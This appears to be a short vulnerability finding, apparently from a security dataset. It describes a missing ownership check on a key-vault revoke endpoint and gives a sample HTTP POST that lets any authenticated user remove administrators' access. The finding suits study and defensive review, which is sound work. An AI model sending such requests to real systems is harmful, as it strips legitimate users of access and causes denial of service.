diagnosis: The view verifies that the target collaborator has access to the KeyVault and calls remove_perm, but fails to check whether request.user possesses administrative or ownership permissions on the vault. Any authenticated user can revoke key vault access from authorized administrators, causing denial of service.
exploit_request:
POST /api/vaults/512/revoke/ HTTP/1.1
Host: api.vault.internal
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"collaborator_id": 10}
